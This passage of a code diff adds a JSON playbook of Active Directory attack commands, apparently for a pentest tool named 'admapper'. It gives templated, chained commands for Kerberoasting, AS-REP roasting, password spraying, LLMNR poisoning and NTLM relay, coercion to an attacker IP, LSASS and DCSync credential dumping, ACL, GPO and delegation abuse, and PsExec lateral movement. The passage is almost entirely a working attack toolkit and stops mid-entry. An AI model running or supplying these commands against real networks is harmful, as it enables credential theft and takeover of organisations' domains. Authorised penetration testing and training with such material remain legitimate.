+              "command": "// All Kerberoastable accounts\nMATCH (u:User {hasspn:true, enabled:true})\nRETURN u.name, u.serviceprincipalnames, u.pwdlastset, u.admincount\nORDER BY u.admincount DESC, u.pwdlastset ASC\n\n// High-value: Kerberoastable DA members\nMATCH (u:User {hasspn:true, enabled:true})-[:MemberOf*1..]->(g:Group)\nWHERE g.name =~ \"(?i)domain admins.*\"\nRETURN u.name, u.serviceprincipalnames\n\n// Kerberoastable with path to DA\nMATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group))\nWHERE g.name =~ \"(?i)domain admins.*\"\nRETURN p LIMIT 5",
+              "next_steps": [
+                "kerb-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "bh-cypher-004",
+              "title": "Unconstrained Delegation",
+              "tool": "BloodHound (Cypher)",
+              "tags": [
+                "bloodhound",
+                "cypher",
+                "delegation",
+                "high-value"
+              ],
+              "opsec": "none",
+              "description": "Find computers and users with Unconstrained Delegation set.",
+              "command": "// Computers with unconstrained delegation (excluding DCs)\nMATCH (c:Computer {unconstraineddelegation:true})\nWHERE NOT c.name =~ \"(?i).*dc.*\"\nRETURN c.name, c.operatingsystem\n\n// Users with unconstrained delegation\nMATCH (u:User {unconstraineddelegation:true})\nRETURN u.name\n\n// Constrained delegation (TrustedToAuth)\nMATCH (n) WHERE n.allowedtodelegate IS NOT NULL AND n.allowedtodelegate <> []\nRETURN n.name, n.allowedtodelegate, labels(n)",
+              "next_steps": [
+                "deleg-001",
+                "deleg-002"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "bh-cypher-005",
+              "title": "Find Owned Objects & DA Paths",
+              "tool": "BloodHound (Cypher)",
+              "tags": [
+                "bloodhound",
+                "cypher"
+              ],
+              "opsec": "none",
+              "description": "Track owned nodes and find DA paths from your current access.",
+              "command": "// List all owned nodes\nMATCH (n {owned:true}) RETURN n.name, labels(n)\n\n// Paths from owned nodes to DA\nMATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group))\nWHERE g.name =~ \"(?i)domain admins.*\"\nAND NOT n=g\nRETURN p\n\n// High value targets not yet owned\nMATCH (n {highvalue:true, owned:false})\nRETURN n.name, labels(n)\n\n// Mark a node as owned (run in BH browser console)\n// MATCH (u:User {name:\"{USERNAME}@{DOMAIN}\"}) SET u.owned=true RETURN u",
+              "next_steps": [
+                "priv-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "bh-cypher-006",
+              "title": "ACL Abuse Paths",
+              "tool": "BloodHound (Cypher)",
+              "tags": [
+                "bloodhound",
+                "cypher",
+                "acl",
+                "high-value"
+              ],
+              "opsec": "none",
+              "description": "Find dangerous ACL relationships: GenericAll, WriteDACL, ForceChangePassword.",
+              "command": "// GenericAll on high-value objects\nMATCH p=(u:User)-[:GenericAll]->(t)\nWHERE t.highvalue=true\nRETURN p\n\n// WriteDACL on Domain\nMATCH p=(u)-[:WriteDacl]->(d:Domain)\nRETURN p\n\n// Owned user -> ACL -> DA path\nMATCH p=(u:User {owned:true})-[:GenericAll|WriteDacl|GenericWrite|WriteOwner|ForceChangePassword*1..]->(t)\nRETURN p\n\n// All dangerous ACLs from current user\nMATCH p=(u:User {name:\"{USERNAME}@{DOMAIN}\"})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AddMember|AllExtendedRights]->(t)\nRETURN p",
+              "next_steps": [
+                "acl-001",
+                "acl-002"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "bh-cypher-007",
+              "title": "High Value Nodes Overview",
+              "tool": "BloodHound (Cypher)",
+              "tags": [
+                "bloodhound",
+                "cypher"
+              ],
+              "opsec": "none",
+              "description": "Comprehensive overview of the most important AD objects to target.",
+              "command": "// All Domain Admin members\nMATCH (u:User)-[:MemberOf*1..]->(g:Group)\nWHERE g.name =~ \"(?i)domain admins.*\"\nRETURN u.name, u.enabled, u.pwdlastset\n\n// Enterprise Admins\nMATCH (u:User)-[:MemberOf*1..]->(g:Group)\nWHERE g.name =~ \"(?i)enterprise admins.*\"\nRETURN u.name\n\n// DCs in the domain\nMATCH (c:Computer {isdc:true})\nRETURN c.name, c.operatingsystem\n\n// Computers with sessions from DA accounts\nMATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:AdminTo]->(c:Computer)\nWHERE g.name =~ \"(?i)domain admins.*\"\nRETURN DISTINCT c.name\n\n// Non-DA users with admin rights to computers\nMATCH (u:User)-[:AdminTo]->(c:Computer)\nWHERE NOT (u)-[:MemberOf*1..]->(:Group {name:\"DOMAIN ADMINS@{DOMAIN}\"})\nRETURN u.name, c.name",
+              "next_steps": [
+                "priv-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "bh-cypher-008",
+              "title": "Sessions & Lateral Movement",
+              "tool": "BloodHound (Cypher)",
+              "tags": [
+                "bloodhound",
+                "cypher",
+                "lateral-movement"
+              ],
+              "opsec": "none",
+              "description": "Find DA sessions on non-DC computers — perfect for token stealing.",
+              "command": "// DA sessions on workstations (not DCs)\nMATCH (u:User)-[:MemberOf*1..]->(g:Group),\n      (u)-[:HasSession]->(c:Computer)\nWHERE g.name =~ \"(?i)domain admins.*\"\nAND NOT c.isdc = true\nRETURN u.name AS DomainAdmin, c.name AS LoggedOnTo\n\n// Computers where owned user has admin\nMATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)\nRETURN u.name, c.name\n\n// Computers reachable with local admin from owned\nMATCH (u:User {owned:true})-[:AdminTo|HasSession|CanRDP*1..]->(c:Computer)\nRETURN DISTINCT c.name",
+              "next_steps": [
+                "lateral-001",
+                "cred-dump-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "key": "attacks",
+      "label": "Attacks & Cred Access",
+      "icon": "⚔️",
+      "color": "#ff4757",
+      "subsections": [
+        {
+          "key": "asrep",
+          "label": "AS-REP Roasting",
+          "commands": [
+            {
+              "id": "asrep-001",
+              "title": "AS-REP Roast (impacket)",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "no-creds-needed",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "Request AS-REP for accounts without Kerberos pre-auth required.",
+              "command": "impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -no-pass -request -format hashcat -outputfile asrep_hashes.txt\nimpacket-GetNPUsers {DOMAIN}/{USERNAME}:{PASSWORD} -request -format hashcat",
+              "next_steps": [
+                "crack-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "asrep-002",
+              "title": "AS-REP Roast (Rubeus)",
+              "tool": "Rubeus",
+              "tags": [
+                "windows",
+                "noisy"
+              ],
+              "opsec": "medium",
+              "description": "Rubeus AS-REP roasting — finds and requests all vulnerable accounts.",
+              "command": ".\\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt\n.\\Rubeus.exe asreproast /user:{TARGET_USER} /format:hashcat",
+              "next_steps": [
+                "crack-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "crack-001",
+              "title": "Crack AS-REP Hashes",
+              "tool": "hashcat",
+              "tags": [
+                "linux",
+                "offline"
+              ],
+              "opsec": "none",
+              "description": "Crack AS-REP hashes offline with hashcat.",
+              "command": "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force\nhashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+              "next_steps": [
+                "spray-001",
+                "kerb-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "kerberoasting",
+          "label": "Kerberoasting",
+          "commands": [
+            {
+              "id": "kerb-001",
+              "title": "Kerberoast (impacket)",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "Request service tickets for all SPN accounts for offline cracking.",
+              "command": "impacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {DC_IP} -request\nimpacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {DC_IP} -request -outputfile kerb_hashes.txt",
+              "next_steps": [
+                "kerb-crack-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "kerb-002",
+              "title": "Kerberoast (Rubeus)",
+              "tool": "Rubeus",
+              "tags": [
+                "windows",
+                "noisy"
+              ],
+              "opsec": "medium",
+              "description": "Rubeus kerberoasting with AES downgrade to RC4.",
+              "command": ".\\Rubeus.exe kerberoast /outfile:kerb_hashes.txt\n.\\Rubeus.exe kerberoast /user:{TARGET_USER} /nowrap\n.\\Rubeus.exe kerberoast /rc4opsec /outfile:kerb_hashes.txt  # RC4 only (crackable)",
+              "next_steps": [
+                "kerb-crack-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "kerb-003",
+              "title": "Kerberoast (PowerView)",
+              "tool": "PowerView",
+              "tags": [
+                "powershell",
+                "requires-creds"
+              ],
+              "opsec": "medium",
+              "description": "Find Kerberoastable accounts using PowerView.",
+              "command": "Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname\nInvoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash",
+              "next_steps": [
+                "kerb-crack-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "kerb-crack-001",
+              "title": "Crack Kerberoast Hashes",
+              "tool": "hashcat",
+              "tags": [
+                "linux",
+                "offline"
+              ],
+              "opsec": "none",
+              "description": "Crack TGS-REP hashes (RC4=13100, AES128=19600, AES256=19700).",
+              "command": "hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt --force\nhashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+              "next_steps": [
+                "lateral-001",
+                "priv-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "password-spray",
+          "label": "Password Spraying",
+          "commands": [
+            {
+              "id": "spray-001",
+              "title": "Password Spray (Kerbrute)",
+              "tool": "Kerbrute",
+              "tags": [
+                "linux",
+                "stealthy",
+                "lockout-risk"
+              ],
+              "opsec": "medium",
+              "description": "Spray passwords against valid usernames via Kerberos.",
+              "command": "kerbrute passwordspray -d {DOMAIN} --dc {DC_IP} users.txt {PASSWORD}\nkerbrute bruteforce -d {DOMAIN} --dc {DC_IP} combos.txt  # user:pass combos",
+              "next_steps": [
+                "lateral-001"
+              ],
+              "admapper_action": {
+                "type": "phase",
+                "endpoint": "/api/spray",
+                "body": {
+                  "password": "{PASSWORD}"
+                }
+              }
+            },
+            {
+              "id": "spray-002",
+              "title": "Password Spray (CME)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-userlist",
+                "lockout-risk",
+                "noisy"
+              ],
+              "opsec": "high",
+              "description": "Spray passwords across domain via SMB — check lockout policy first!",
+              "command": "crackmapexec smb {DC_IP} -u users.txt -p {PASSWORD} --continue-on-success\ncrackmapexec smb {DC_IP}/24 -u {USERNAME} -p passwords.txt --no-bruteforce",
+              "next_steps": [
+                "lateral-001"
+              ],
+              "admapper_action": {
+                "type": "phase",
+                "endpoint": "/api/spray",
+                "body": {
+                  "password": "{PASSWORD}"
+                }
+              }
+            },
+            {
+              "id": "spray-003",
+              "title": "Password Spray (DomainPasswordSpray)",
+              "tool": "DomainPasswordSpray",
+              "tags": [
+                "powershell",
+                "lockout-risk"
+              ],
+              "opsec": "medium",
+              "description": "Smart spray that observes AD lockout policy automatically.",
+              "command": "Invoke-DomainPasswordSpray -Password {PASSWORD} -OutFile spray_results.txt\nInvoke-DomainPasswordSpray -UserList users.txt -Password {PASSWORD} -Force",
+              "next_steps": [],
+              "admapper_action": {
+                "type": "phase",
+                "endpoint": "/api/spray",
+                "body": {
+                  "password": "{PASSWORD}"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "key": "ntlm-relay",
+          "label": "NTLM Relay",
+          "commands": [
+            {
+              "id": "ntlm-relay-001",
+              "title": "NTLM Relay Setup (Responder + ntlmrelayx)",
+              "tool": "Responder / impacket",
+              "tags": [
+                "linux",
+                "noisy",
+                "no-creds"
+              ],
+              "opsec": "high",
+              "description": "Capture and relay NTLM auth — requires SMB signing disabled.",
+              "command": "# Step 1: Disable SMB/HTTP in Responder\nsed -i 's/SMB = On/SMB = Off/;s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf\nresponder -I eth0 -wf\n\n# Step 2: Relay to targets (from relay_targets.txt)\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -c \"whoami\"",
+              "next_steps": [
+                "cred-dump-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "ntlm-relay-002",
+              "title": "NTLM Relay to LDAP (LDAP Signing Off)",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "high-value"
+              ],
+              "opsec": "high",
+              "description": "Relay auth to LDAP for ACL abuse or Shadow Credentials.",
+              "command": "impacket-ntlmrelayx -t ldap://{DC_IP} --delegate-access\nimpacket-ntlmrelayx -t ldaps://{DC_IP} --shadow-credentials --shadow-target {TARGET_COMPUTER}$",
+              "next_steps": [
+                "shadow-creds-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "shadow-creds-001",
+              "title": "Shadow Credentials",
+              "tool": "PyWhisker / Certipy",
+              "tags": [
+                "linux",
+                "high-value",
+                "requires-creds"
+              ],
+              "opsec": "medium",
+              "description": "Add shadow credentials to machine account for auth.",
+              "command": "python3 pywhisker.py -d {DOMAIN} -u {USERNAME} -p {PASSWORD} --target {TARGET_COMPUTER}$ --action add\ncertipy shadow auto -username {USERNAME}@{DOMAIN} -password {PASSWORD} -account {TARGET_COMPUTER}$",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "llmnr-poisoning",
+          "label": "LLMNR/NBT-NS Poisoning",
+          "commands": [
+            {
+              "id": "llmnr-001",
+              "title": "Responder (LLMNR Poisoning)",
+              "tool": "Responder",
+              "tags": [
+                "linux",
+                "noisy",
+                "no-creds"
+              ],
+              "opsec": "high",
+              "description": "Poison LLMNR/NBT-NS to capture NTLMv1/v2 hashes.",
+              "command": "responder -I eth0 -wFb\nresponder -I eth0 -w  # Basic mode\n# Hashes saved to /usr/share/responder/logs/",
+              "next_steps": [
+                "ntlm-relay-001",
+                "crack-ntlm"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "crack-ntlm",
+              "title": "Crack NTLMv2 Hashes",
+              "tool": "hashcat",
+              "tags": [
+                "linux",
+                "offline"
+              ],
+              "opsec": "none",
+              "description": "Crack captured NTLMv2 challenge-response hashes.",
+              "command": "hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt --force\n# NTLMv1: -m 5500",
+              "next_steps": [
+                "spray-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "cred-dumping",
+          "label": "Credential Dumping",
+          "commands": [
+            {
+              "id": "cred-dump-001",
+              "title": "LSASS Dump (Mimikatz)",
+              "tool": "Mimikatz",
+              "tags": [
+                "windows",
+                "requires-admin",
+                "very-noisy"
+              ],
+              "opsec": "critical",
+              "description": "Dump credentials from LSASS process memory.",
+              "command": "mimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\nmimikatz # sekurlsa::wdigest\n# Dump to file:\nmimikatz # log lsass_dump.txt\nmimikatz # sekurlsa::logonpasswords",
+              "next_steps": [
+                "pth-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "cred-dump-002",
+              "title": "LSASS Dump (CME)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-admin",
+                "very-noisy"
+              ],
+              "opsec": "critical",
+              "description": "Remote LSASS dump via CrackMapExec.",
+              "command": "crackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M lsassy\ncrackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -H {NTLM_HASH} -M lsassy",
+              "next_steps": [
+                "pth-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "cred-dump-003",
+              "title": "SAM & SYSTEM Dump",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "requires-admin"
+              ],
+              "opsec": "high",
+              "description": "Remotely dump SAM database containing local hashes.",
+              "command": "impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_COMPUTER}\nimpacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_COMPUTER} -just-dc\nimpacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc-ntds",
+              "next_steps": [
+                "golden-ticket-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "cred-dump-004",
+              "title": "NTDS.dit Dump (DCSync)",
+              "tool": "Mimikatz / impacket",
+              "tags": [
+                "requires-da",
+                "very-noisy",
+                "high-value"
+              ],
+              "opsec": "critical",
+              "description": "DCSync attack — pull all domain hashes as if you're a DC.",
+              "command": "# Mimikatz:\nmimikatz # lsadump::dcsync /domain:{DOMAIN} /all /csv\nmimikatz # lsadump::dcsync /domain:{DOMAIN} /user:krbtgt\n\n# impacket:\nimpacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc-ntds -outputfile ntds_dump",
+              "next_steps": [
+                "golden-ticket-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "cred-dump-005",
+              "title": "Credential Hunt (CME)",
+              "tool": "CrackMapExec / NetExec",
+              "tags": [
+                "requires-admin",
+                "noisy"
+              ],
+              "opsec": "high",
+              "description": "Hunt for credentials in various locations on remote machines.",
+              "command": "crackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M mimikatz\ncrackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M nanodump",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "coercion",
+          "label": "Auth Coercion",
+          "commands": [
+            {
+              "id": "coerce-001",
+              "title": "PetitPotam (MS-EFSRPC Coercion)",
+              "tool": "PetitPotam",
+              "tags": [
+                "linux",
+                "no-creds",
+                "high-value"
+              ],
+              "opsec": "high",
+              "description": "Coerce a DC/host to authenticate to your machine — pair with NTLM relay (ESC8/RBCD).",
+              "command": "# Unauthenticated (older/unpatched):\npython3 PetitPotam.py {ATTACKER_IP} {DC_IP}\n\n# Authenticated:\npython3 PetitPotam.py -u {USERNAME} -p {PASSWORD} -d {DOMAIN} {ATTACKER_IP} {DC_IP}\n\n# netexec module:\nnetexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -M petitpotam",
+              "next_steps": [
+                "adcs-esc8-001",
+                "ntlm-relay-002"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "coerce-002",
+              "title": "Coercer (Multi-Method Coercion)",
+              "tool": "Coercer",
+              "tags": [
+                "linux",
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "high",
+              "description": "Spray every known coercion RPC method (EFSRPC, DFSNM, PrinterBug, etc.) against a target.",
+              "command": "coercer coerce -u {USERNAME} -p {PASSWORD} -d {DOMAIN} -t {DC_IP} -l {ATTACKER_IP}\ncoercer scan -u {USERNAME} -p {PASSWORD} -d {DOMAIN} -t {DC_IP}",
+              "next_steps": [
+                "ntlm-relay-002",
+                "adcs-esc8-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "coerce-003",
+              "title": "PrinterBug / SpoolSample (MS-RPRN)",
+              "tool": "printerbug / dementor",
+              "tags": [
+                "high-value"
+              ],
+              "opsec": "high",
+              "description": "Abuse the spooler service to coerce auth — classic unconstrained delegation trigger.",
+              "command": "# Linux (impacket-based):\npython3 printerbug.py {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} {ATTACKER_IP}\n\n# Windows:\n.\\SpoolSample.exe {DC_IP} {ATTACKER_IP}\n\n# Check if spooler is reachable:\nrpcdump.py {DC_IP} | grep -i spool",
+              "next_steps": [
+                "deleg-001",
+                "ntlm-relay-002"
+              ],
+              "admapper_action": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "key": "privesc",
+      "label": "Privilege Escalation",
+      "icon": "⬆️",
+      "color": "#ffa502",
+      "subsections": [
+        {
+          "key": "local-privesc",
+          "label": "Local Priv Esc",
+          "commands": [
+            {
+              "id": "local-001",
+              "title": "Local Priv Esc Audit (WinPEAS)",
+              "tool": "WinPEAS",
+              "tags": [
+                "windows",
+                "noisy",
+                "requires-local"
+              ],
+              "opsec": "high",
+              "description": "Comprehensive local privilege escalation enumeration.",
+              "command": ".\\winPEASx64.exe\n.\\winPEASx64.exe quiet cmd fast\n\n# Or PowerShell version:\nInvoke-PowerSploitSweep\nGet-UnquotedService\nGet-ModifiableServiceFile",
+              "next_steps": [],
+              "admapper_action": null
+            },
+            {
+              "id": "local-002",
+              "title": "Token Impersonation (Incognito)",
+              "tool": "Mimikatz / Incognito",
+              "tags": [
+                "windows",
+                "requires-local-admin"
+              ],
+              "opsec": "medium",
+              "description": "Impersonate available tokens on the system.",
+              "command": "mimikatz # token::elevate\nmimikatz # token::list\nmimikatz # token::impersonate /user:{TARGET_USER}",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "domain-privesc",
+          "label": "Domain Priv Esc",
+          "commands": [
+            {
+              "id": "priv-001",
+              "title": "Find Paths to DA (BloodHound)",
+              "tool": "BloodHound",
+              "tags": [
+                "requires-bh-data",
+                "high-value"
+              ],
+              "opsec": "none",
+              "description": "Use BloodHound to find shortest paths to Domain Admin.",
+              "command": "# BloodHound Cypher Queries:\nMATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:\"DOMAIN ADMINS@{DOMAIN}\"})) RETURN p\nMATCH (u:User {owned:true})-[r:MemberOf|AdminTo|HasSession|CanRDP*1..]->(g:Group {name:\"DOMAIN ADMINS@{DOMAIN}\"}) RETURN u, r, g",
+              "next_steps": [
+                "acl-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "priv-002",
+              "title": "MS14-068 Kerberos Vuln",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "old-systems"
+              ],
+              "opsec": "medium",
+              "description": "Exploit MS14-068 — escalate any user to Domain Admin on old DCs.",
+              "command": "impacket-goldenPac {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP}",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "acl-abuse",
+          "label": "ACL Abuse",
+          "commands": [
+            {
+              "id": "acl-001",
+              "title": "Find ACL Misconfigs (PowerView)",
+              "tool": "PowerView",
+              "tags": [
+                "powershell",
+                "requires-creds"
+              ],
+              "opsec": "low",
+              "description": "Enumerate dangerous ACLs on AD objects.",
+              "command": "Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match \"GenericAll|WriteOwner|WriteDacl|ForceChangePassword\" -and $_.IdentityReference -notmatch \"BUILTIN|Domain Admins|Enterprise Admins|NT AUTHORITY\"}\nFind-InterestingDomainAcl -ResolveGUIDs",
+              "next_steps": [
+                "acl-002",
+                "acl-003"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "acl-002",
+              "title": "GenericAll / ForceChangePassword",
+              "tool": "PowerView / impacket",
+              "tags": [
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "Abuse GenericAll to reset user password.",
+              "command": "# PowerView:\nSet-DomainUserPassword -Identity {TARGET_USER} -AccountPassword (ConvertTo-SecureString '{PASSWORD}' -AsPlainText -Force)\n\n# impacket:\nimpacket-rpcclient {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -c \"setuserinfo2 {TARGET_USER} 23 '{PASSWORD}'\"",
+              "next_steps": [
+                "lateral-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "acl-003",
+              "title": "DCSync Rights Abuse (WriteDacl)",
+              "tool": "PowerView / impacket",
+              "tags": [
+                "requires-creds",
+                "high-value"
+              ],
+              "opsec": "medium",
+              "description": "Add DCSync rights to a user via WriteDacl on domain.",
+              "command": "Add-DomainObjectAcl -TargetIdentity \"DC={DOMAIN}\" -PrincipalIdentity {USERNAME} -Rights DCSync\nimpacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc",
+              "next_steps": [
+                "cred-dump-004"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "gpo-abuse",
+          "label": "GPO Abuse",
+          "commands": [
+            {
+              "id": "gpo-001",
+              "title": "Find Writable GPOs",
+              "tool": "PowerView",
+              "tags": [
+                "powershell",
+                "requires-creds"
+              ],
+              "opsec": "low",
+              "description": "Find GPOs that current user can modify.",
+              "command": "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match \"CreateChild|WriteProperty|GenericWrite|GenericAll\" -and $_.IdentityReference -match {USERNAME}}",
+              "next_steps": [
+                "gpo-002"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "gpo-002",
+              "title": "GPO Abuse (SharpGPOAbuse)",
+              "tool": "SharpGPOAbuse",
+              "tags": [
+                "windows",
+                "requires-creds",
+                "noisy"
+              ],
+              "opsec": "high",
+              "description": "Abuse GPO write access to add user to local admins.",
+              "command": ".\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {USERNAME} --GPOName \"Vulnerable GPO\"\n.\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Updater\" --Author {DOMAIN}\\{USERNAME} --Command \"cmd.exe\" --Arguments '/c net localgroup administrators {USERNAME} /add' --GPOName \"Vulnerable GPO\"",
+              "next_steps": [],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "delegation-abuse",
+          "label": "Delegation Abuse",
+          "commands": [
+            {
+              "id": "deleg-001",
+              "title": "Unconstrained Delegation",
+              "tool": "Rubeus / impacket",
+              "tags": [
+                "windows",
+                "high-value",
+                "requires-admin-on-target"
+              ],
+              "opsec": "medium",
+              "description": "Abuse unconstrained delegation — trigger DC auth and extract TGT.",
+              "command": "# Find unconstrained delegation hosts:\nGet-DomainComputer -Unconstrained\n\n# Monitor for and extract incoming TGTs:\n.\\Rubeus.exe monitor /interval:5 /nowrap\n\n# Trigger DC auth (PrinterBug / SpoolSample):\n.\\SpoolSample.exe {DC_IP} {TARGET_COMPUTER}",
+              "next_steps": [
+                "golden-ticket-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "deleg-002",
+              "title": "Constrained Delegation",
+              "tool": "Rubeus / impacket",
+              "tags": [
+                "high-value",
+                "requires-creds"
+              ],
+              "opsec": "medium",
+              "description": "Abuse S4U2Proxy to impersonate any user to allowed services.",
+              "command": "# Find constrained delegation accounts:\nGet-DomainUser -TrustedToAuth\nGet-DomainComputer -TrustedToAuth\n\n# Request impersonation ticket:\n.\\Rubeus.exe s4u /user:{USERNAME} /rc4:{NTLM_HASH} /impersonateuser:Administrator /msdsspn:cifs/{TARGET_COMPUTER} /altservice:http,wsman,host /ptt\n\nimpacket-getST {DOMAIN}/{USERNAME} -hashes :{NTLM_HASH} -spn cifs/{TARGET_COMPUTER} -impersonate Administrator",
+              "next_steps": [
+                "lateral-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "deleg-003",
+              "title": "RBCD Attack",
+              "tool": "impacket / PowerView",
+              "tags": [
+                "high-value",
+                "requires-write-to-computer"
+              ],
+              "opsec": "medium",
+              "description": "Resource-Based Constrained Delegation — write msDS-AllowedToActOnBehalfOfOtherIdentity.",
+              "command": "# Add new machine account:\nimpacket-addcomputer {DOMAIN}/{USERNAME}:{PASSWORD} -computer-name FAKE_PC$ -computer-pass FakePass123!\n\n# Set RBCD:\nSet-DomainRBCD {TARGET_COMPUTER} -DelegateFrom FAKE_PC$\n\n# Get ST:\nimpacket-getST {DOMAIN}/FAKE_PC$:FakePass123! -spn cifs/{TARGET_COMPUTER}.{DOMAIN} -impersonate Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec {DOMAIN}/Administrator@{TARGET_COMPUTER} -k -no-pass",
+              "next_steps": [
+                "cred-dump-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "key": "lateral",
+      "label": "Lateral Movement",
+      "icon": "↔️",
+      "color": "#2ed573",
+      "subsections": [
+        {
+          "key": "psexec",
+          "label": "PsExec",
+          "commands": [
+            {
+              "id": "lateral-001",
+              "title": "PsExec (impacket)",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "requires-admin",
+                "noisy"
+              ],
+              "opsec": "high",
+              "description": "Execute commands remotely via SMB and named pipes.",
+              "command": "impacket-psexec {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_COMPUTER}\nimpacket-psexec {DOMAIN}/{USERNAME}@{TARGET_COMPUTER} -hashes :{NTLM_HASH}",
+              "next_steps": [
+                "cred-dump-001"
+              ],
+              "admapper_action": null
+            },
+            {
+              "id": "lateral-002",
+              "title": "SMBExec (impacket)",
+              "tool": "impacket",
+              "tags": [
+                "linux",
+                "requires-admin",
+                "stealth-alternative"
+              ],
+              "opsec": "medium",
+              "description": "SMB execution — more evasive than PsExec (no service binary dropped).",
+              "command": "impacket-smbexec {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_COMPUTER}\nimpacket-smbexec {DOMAIN}/{USERNAME}@{TARGET_COMPUTER} -hashes :{NTLM_HASH}",
+              "next_steps": [
+                "cred-dump-001"
+              ],
+              "admapper_action": null
+            }
+          ]
+        },
+        {
+          "key": "wmi",
+          "label": "WMI",
+          "commands": [
+            {
+              "id": "wmi-001",
+              "title": "WMI Exec (impacket)",
